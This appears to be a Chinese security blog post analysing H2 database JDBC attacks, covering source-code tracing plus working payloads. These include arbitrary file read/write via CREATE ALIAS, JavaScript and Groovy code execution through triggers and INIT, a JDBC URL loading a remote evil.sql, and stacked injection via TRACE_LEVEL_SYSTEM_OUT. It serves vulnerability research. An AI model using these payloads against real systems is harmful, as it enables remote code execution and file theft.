+<p><img src="/./../img/image-20230810145651068.png" srcset="/img/loading.gif" lazyload alt="image-20230810145651068"></p>
+<p>跟进<code>FunctionAlias#newInstanceFromSource</code></p>
+<p><img src="/./../img/image-20230810145914667.png" srcset="/img/loading.gif" lazyload alt="image-20230810145914667"></p>
+<p>跟进<code>init</code>，注释说会尝试编译类，接着进入<code>loadFromSource</code></p>
+<p><img src="/./../img/image-20230810150159093.png" srcset="/img/loading.gif" lazyload alt="image-20230810150159093"></p>
+<p>将别名和<code>org.h2.dynamic</code>进行拼接，得到一个全类名</p>
+<p><img src="/./../img/image-20230810150412707.png" srcset="/img/loading.gif" lazyload alt="image-20230810150412707"></p>
+<p>下面的<code>compilier.setSource</code>就是把全类名和自定义函数的代码放入一个source成员(一个键值均为String的HashMap)</p>
+<p>接着试图加载这个拼接的全类名，并获取第一个公开的静态方法，且不以<code>_</code>或<code>main</code>开头</p>
+<p><img src="/./../img/image-20230810150806183.png" srcset="/img/loading.gif" lazyload alt="image-20230810150806183"></p>
+<p>进入<code>getClass</code></p>
+<p><img src="/./../img/image-20230810154754442.png" srcset="/img/loading.gif" lazyload alt="image-20230810154754442"></p>
+<p>从<code>compiled</code>编译过的类中尝试获取，然后自定义了一个<code>Classloader</code>类加载器，重写了<code>findClass</code>方法</p>
+<p><img src="/./../img/image-20230810155131958.png" srcset="/img/loading.gif" lazyload alt="image-20230810155131958"></p>
+<p><code>getCompleteSourceCode</code>构造出完整的一个类的代码(首行声明包名、类声明、方法加上public、static修饰符)</p>
+<p><img src="/./../img/image-20230810152333492.png" srcset="/img/loading.gif" lazyload alt="image-20230810152333492"></p>
+<p>回退到<code>findClass</code>，跟进<code>javaxToolsJavac</code>用于编译、加载类</p>
+<p><img src="/./../img/image-20230810160713450.png" srcset="/img/loading.gif" lazyload alt="image-20230810160713450"></p>
+<p>用了lombok这里机会产生错误信息，进入<code>handleSyntaxError</code>报错</p>
+<p>对比高版本的H2，<code>handleSyntaxError</code>多传了一个参数，若第二个参数是0则直接返回，不进行语法错误处理</p>
+<p><code>handleSyntaxError*(output, (ok? 0: 1));</code></p>
+<p>那如果遇上目标用了lombok还是H2低版本呢?只能考虑调用目标本地的静态公开方法</p>
+<p>如<code>com.sun.org.apache.xml.internal.security.utils.JavaUtils</code>有两个读写文件的静态公开方法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS read <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;com.sun.org.apache.xml.internal.security.utils.JavaUtils.getBytesFromFile&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> read(<span class="hljs-string">&#x27;E:/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20230810163716096.png" srcset="/img/loading.gif" lazyload alt="image-20230810163716096"></p>
+<p>读出来的结果为byte数组，还得转为字符串</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = &#123;<span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>&#125;;<br>System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes));  <span class="hljs-comment">// 打印here is my flag</span><br></code></pre></td></tr></table></figure>
+
+<p>虽然<code>writeBytesToFilename</code>第二个参数要求为byte数组，但传字符串也行，H2能够自动转换。或者在十六进制字符串前面加个X。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS write <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> write(<span class="hljs-string">&#x27;E:/success.txt&#x27;</span>, <span class="hljs-string">&#x27;Arbitrary File Write&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> write(<span class="hljs-string">&#x27;E:/wirte_hex.txt&#x27;</span>, X<span class="hljs-string">&#x27;68657265206973206d7920666c6167&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20230810164626253.png" srcset="/img/loading.gif" lazyload alt="image-20230810164626253"></p>
+<p>当然还有其他静态方法可以利用，比如</p>
+<ul>
+<li><code>java.sql.DriverManager#getConnection</code> 连接恶意MySQL服务器</li>
+<li><code>javax.naming.InitialContext#doLookup</code> JNDI注入</li>
+<li><code>com.alibaba.fastjson.JSON#parseObject</code> FastJson反序列化</li>
+<li><code>org.springframework.util.SerializationUtils.deserialize</code> 二次反序列化</li>
+</ul>
+<p>咳咳，扯远了，继续回到H2 RCE。</p>
+<h2 id="js执行"><a href="#js执行" class="headerlink" title="js执行"></a>js执行</h2><ul>
+<li><code>CREATE TRIGGER</code></li>
+</ul>
+<p>这个命令稍微麻烦一点，利用的是触发器，即增删改时会触发一些动作，需要新建一张表，或者需要有已知表。</p>
+<p>下面上网上流传的poc</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> hack (<br>     id <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span><br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> TRIG_JS AFTER <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ON</span> hack <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;//javascript</span><br><span class="hljs-string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;);&#x27;</span>;<br> <br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hack <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>
+
+<p>但实际上创建触发器时那段js代码就被执行了，后面插入数据也没有执行</p>
+<p>好在这句创建触发器的语句可以多次执行(因为根本没创建成功)</p>
+<p>为什么呢？因为这段js代码本意是用来返回一个<code>Trigger</code>对象的</p>
+<p>查看官方文档<a target="_blank" rel="noopener" href="https://www.h2database.com/html/commands.html#create_trigger">https://www.h2database.com/html/commands.html#create_trigger</a></p>
+<blockquote>
+<p>The trigger class must be public and implement <code>org.h2.api.Trigger</code>. Inner classes are not supported. The class must be available in the classpath of the database engine (when using the server mode, it must be in the classpath of the server).</p>
+<p>The sourceCodeString must define a single method with no parameters that returns <code>org.h2.api.Trigger</code>. See <code>CREATE ALIAS</code> for requirements regarding the compilation. Alternatively, javax.script.ScriptEngineManager can be used to create an instance of <code>org.h2.api.Trigger</code>. Currently javascript (included in every <code>JRE</code>) and ruby (with <code>JRuby</code>) are supported. In that case the source must begin respectively with <code>//javascript</code> or <code>#ruby</code>.</p>
+<p>Example:</p>
+<p>CREATE TRIGGER TRIG_INS BEFORE INSERT ON TEST FOR EACH ROW CALL ‘MyTrigger’;</p>
+<p>CREATE TRIGGER TRIG_SRC BEFORE INSERT ON TEST AS<br>  ‘org.h2.api.Trigger create() { return new MyTrigger(“constructorParam”); }’;</p>
+<p>CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS ‘&#x2F;&#x2F;javascript<br>return new Packages.MyTrigger(“constructorParam”);’;</p>
+<p>CREATE TRIGGER TRIG_RUBY BEFORE INSERT ON TEST AS ‘#ruby<br>Java::MyPackage::MyTrigger.new(“constructorParam”)’;</p>
+</blockquote>
+<p>可以用<code>javax.script.ScriptEngineManager</code>来创建一个<code>org.h2.api.Trigger</code>实例</p>
+<p><code>org.h2.schema.TriggerObject#loadFromSource</code></p>
+<p><img src="/./../img/image-20230810182752759.png" srcset="/img/loading.gif" lazyload alt="image-20230810182752759"></p>
+<p>判断是否为js或ruby脚本</p>
+<p><img src="/./../img/image-20230810182816425.png" srcset="/img/loading.gif" lazyload alt="image-20230810182816425"></p>
+<p>简单判断是否以<code>//javascript</code>开头</p>
+<p><img src="/./../img/image-20230810182917740.png" srcset="/img/loading.gif" lazyload alt="image-20230810182917740"></p>
+<p>然后就是经典的<code>new ScriptEngineManager().getEngineByName(&quot;javascript&quot;)</code></p>
+<p><img src="/./../img/image-20230810183249317.png" srcset="/img/loading.gif" lazyload alt="image-20230810183249317"></p>
+<p>返回<code>CompiledScript</code>调用其<code>eval</code></p>
+<p>低版本H2(1.4.200之前)貌似不支持js脚本，没有<code>isJavascriptSource</code>这段代码</p>
+<h2 id="出网利用——init-runscript"><a href="#出网利用——init-runscript" class="headerlink" title="出网利用——init+runscript"></a>出网利用——init+runscript</h2><p>上面这些操作的利用前提都是h2 console成功连接到数据库。</p>
+<p>低版本H2(<code>1.4.193</code>左右)当连接的数据库不存在时会自动创建，但高版本就不行了</p>
+<p>会报错<code>Database &quot;mem:test&quot; not found.either pre-create it or allow remote database creation</code></p>
+<p>要么连接Springboot中<code>spring.datasource.url</code>指明的数据库，要么需要启动console时带上<code>-ifNotExists</code>参数</p>
+<p>因此能否不连接进去就能执行命令呢?</p>
+<p>h2数据库的JDBC URL中支持的一个配置<code>INIT</code></p>
+<p>这个参数表示在连接h2数据库时，会执行一条初始化命令。不过只支持执行一条命令，而且不能包含分号<code>;</code> </p>
+<p>上面<code>CREATE ALIAS</code>用于命令执行的SQL语句都不止一条。可以利用<code>RUNSCRIPT</code>命令。<code>RUNSCRIPT</code>用于执行一个SQL文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">jdbc:h2:mem:test;<span class="hljs-attribute">INIT</span>=RUNSCRIPT <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;http://127.0.0.1:8888/evil.sql&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>这个方法能用在任何能配置JDBC URL且依赖了H2的地方</p>
+<p><img src="/./../img/image-20230810170824027.png" srcset="/img/loading.gif" lazyload alt="image-20230810170824027"></p>
+<p>(URL远程加载)</p>
+<h2 id="不出网利用——init-groovy"><a href="#不出网利用——init-groovy" class="headerlink" title="不出网利用——init+groovy"></a>不出网利用——init+groovy</h2><p>JDBC连接时<code>INIT</code>只允许执行一条SQL命令，而我们的命令执行有两句，一句创建UDF，一句执行UDF</p>
+<p>除非有已知表，使用<code>CREATE TRIGGER</code>就只需一句。实际上可以利用H2的系统表，H2和MySQL一样也有<code>INFORMATION_SCHEMA</code></p>
+<blockquote>
+<p>The system tables and views in the schema <code>INFORMATION_SCHEMA</code> contain the meta data of all tables, views, domains, and other objects in the database as well as the current settings.</p>
+</blockquote>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">jdbc:h2:mem:test;init=<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> TRIG_JS <span class="hljs-keyword">AFTER</span> <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ON</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;//javascript</span><br><span class="hljs-string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>需要注意的是，H2提取URL中的配置时是通过分割分号<code>;</code>来提取的，<del>因此JS代码中不能有分号，否则会报错</del>（可以加上反斜杠代表转义）</p>
+<p><img src="/./../img/image-20230810231831479.png" srcset="/img/loading.gif" lazyload alt="image-20230810231831479"></p>
+<p>若目标环境有<code>Groovy</code>依赖，可以使用元编程的技巧来命令执行，在编译<code>Groovy</code>语句而非执行时就执行攻击者的代码。</p>
+<p>添加<code>groovy-sql</code>依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.codehaus.groovy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>groovy-sql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">jdbc:h2:mem:test;init<span class="hljs-operator">=</span><span class="hljs-keyword">CREATE</span> ALIAS shell2 <span class="hljs-keyword">AS</span><br>$$<span class="hljs-variable">@groovy</span>.transform.ASTTest(<span class="hljs-keyword">value</span><span class="hljs-operator">=</span>&#123;<br>assert java.lang.Runtime.getRuntime().<span class="hljs-keyword">exec</span>(&quot;cmd.exe /c calc.exe&quot;)<br>&#125;)<br>def x$$<br></code></pre></td></tr></table></figure>
+
+<h2 id="SQLI-2-RCE"><a href="#SQLI-2-RCE" class="headerlink" title="SQLI 2 RCE"></a>SQLI 2 RCE</h2><p><code>INIT</code>参数可以直接在连接数据库时执行初始化的sql语句</p>
+<p>除了<code>INIT</code>参数，一些参数在连接数据库时会执行SET命令，存在SQL注入</p>
+<p>比如<code>TRACE_LEVEL_SYSTEM_OUT</code>、<code>TRACE_MAX_FILE_SIZE</code>……</p>
+<p><img src="/./../img/image-20230811095343295.png" srcset="/img/loading.gif" lazyload alt="image-20230811095343295"></p>
+<p><code>org.h2.engine.Engine#openSession</code>会对我们传入的参数进行<code>SET</code>语句拼接</p>
+<p><img src="/./../img/image-20230811102607809.png" srcset="/img/loading.gif" lazyload alt="image-20230811102607809"></p>
+<p>开始尝试堆叠注入</p>
+<h3 id="坑：semicolon分割之痛"><a href="#坑：semicolon分割之痛" class="headerlink" title="坑：semicolon分割之痛"></a>坑：semicolon分割之痛</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">3</span>;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> TRIG_JS <span class="hljs-keyword">BEFORE</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">ON</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">AS</span> $$<span class="language-bash">//javascript</span><br><span class="language-bash">Java.<span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;calc&quot;</span>)$$</span><span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p>这个payload并不能打通，还得看它是怎么提取setting参数的</p>
+<p><code>org.h2.engine.ConnectionInfo#readSettingsFromURL</code> 这个类用于存储连接信息</p>
+<p><img src="/./../img/image-20230811103427436.png" srcset="/img/loading.gif" lazyload alt="image-20230811103427436"></p>
+<p>问题就出在这，我们用于堆叠注入的分号<code>;</code>，同时也是H2用来提取设置参数的分隔符。。。🥲</p>
+<p>但要是settings的值本来就存在分号怎么办，照理是会提供转义的，跟进<code>StringUtils.arraySplit</code>一探究竟</p>
+<p><img src="/./../img/image-20230811104152849.png" srcset="/img/loading.gif" lazyload alt="image-20230811104152849"></p>
+<p>果然是支持反斜杠转义的。因此在payload中分号前面加上<code>\</code>即可</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">1</span>\;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> TRIG_JS <span class="hljs-keyword">BEFORE</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">ON</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">AS</span> $$<span class="language-bash">//javascript</span><br><span class="language-bash">Java.<span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;calc&quot;</span>)$$</span><span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="0x04-Recap"><a href="#0x04-Recap" class="headerlink" title="0x04 Recap"></a>0x04 Recap</h1><p>本文简单介绍了H2的JDBC攻击方法，在JDBC URL可控的情况下（不局限于h2 web console）</p>
+<ul>
+<li>JNDI注入（高版本限制了只能是java协议）</li>
+<li>利用init参数执行<code>RUNSCRIPT</code>命令加载执行远程恶意SQL</li>
+<li>利用init参数直接执行<code>groovy</code>元编程代码（不出网）</li>
+<li>利用其他连接参数进行堆叠注入</li>
+</ul>
+<p>当然若能直接连接上去，就能直接UDF命令执行了。</p>
+<p>而对于h2 web console，利用方式会受到一些限制：</p>
+<ul>
+<li>需要开启<code>-webAllowOthers</code>选项，支持外部连接</li>
+<li>需要开启<code>-ifNotExists</code>选项，支持创建数据库</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/security/" class="print-no-link">#security</a>
+      
+        <a href="/tags/jdbc/" class="print-no-link">#jdbc</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>JDBC Attack in H2 DB</div>
+      <div>http://example.com/2023/08/09/h2rce/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/21/jdk17/" title="gadgets under jdk17">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">gadgets under jdk17</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/05/sqli/" title="SQL injection Black Magic">
+                        <span class="hidden-mobile">SQL injection Black Magic</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
